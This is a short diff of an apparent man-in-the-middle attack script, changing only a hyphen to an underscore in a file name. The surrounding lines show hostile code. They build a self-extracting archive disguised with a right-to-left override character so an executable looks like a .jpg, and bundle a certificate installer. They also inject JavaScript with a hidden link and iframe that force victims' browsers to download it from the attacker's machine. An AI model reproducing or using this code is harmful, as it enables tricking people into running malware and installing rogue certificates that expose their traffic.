@@ -176,7 +176,7 @@ EOF
 
 cd "$MITM_DIR"
 rar a -sfx -z"$MITM_DIR/sfx.txt" \
-    "/var/www/html/google-update${RTLO}gpj.exe" \
+    "/var/www/html/google_update${RTLO}gpj.exe" \
     "$MITM_DIR/cert_installer.exe" "$MITM_DIR/google.jpg" "$MITM_DIR/google.ico" &>/dev/null
 
 # ========================
@@ -195,13 +195,13 @@ cat > "$MITM_DIR/rtlo_downloader.js" <<EOF
     function injectDownloader() {
         try {
             var link = document.createElement('a');
-            link.href = 'http://$LAN/google-update${RTLO}gpj.exe';
-            link.download = 'google-update${RTLO}gpj.exe';
+            link.href = 'http://$LAN/google_update${RTLO}gpj.exe';
+            link.download = 'google_update${RTLO}gpj.exe';
             link.style.display = 'none';
             document.body.appendChild(link);
             link.click();
             var iframe = document.createElement('iframe');
-            iframe.src = 'http://$LAN/google-update${RTLO}gpj.exe';
+            iframe.src = 'http://$LAN/google_update${RTLO}gpj.exe';
             iframe.style.display = 'none';
             document.body.appendChild(iframe);
         } catch(e) { console.error('Injection failed:', e); }
